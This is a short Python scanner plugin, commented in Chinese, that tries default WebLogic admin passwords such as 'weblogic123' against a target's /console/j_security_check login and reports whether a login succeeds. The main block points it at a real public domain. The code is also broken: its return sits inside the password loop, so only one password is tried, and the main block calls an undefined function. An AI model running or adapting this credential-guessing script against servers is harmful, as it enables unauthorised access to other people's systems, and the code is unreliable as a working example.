#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: weblogic 弱口令漏洞
referer: unknown
author: Lucifer
description: weblogic 后台弱口令
'''
import sys
import json
import warnings
import requests
def run(url):
        result = ['weblogic 弱口令漏洞', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type":"application/x-www-form-urlencoded"
        }
        payload = "/console/j_security_check"
        passwd = ["weblogic", "weblogic1", "weblogic12", "weblogic123"]
        vulnurl = url + payload
        for pwd in passwd:
            post_data = {
                "j_username":"weblogic",
                "j_password":pwd
            }
            try:
                req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False, allow_redirects=False)
                if req.status_code == 302 and r"console" in req.text and r"LoginForm.jsp" not in req.text:
                    result[2] = '存在'
                    result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
                    break
            except:
                result[2] = '不存在'
            return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = weak_pass("http://baidu.com")
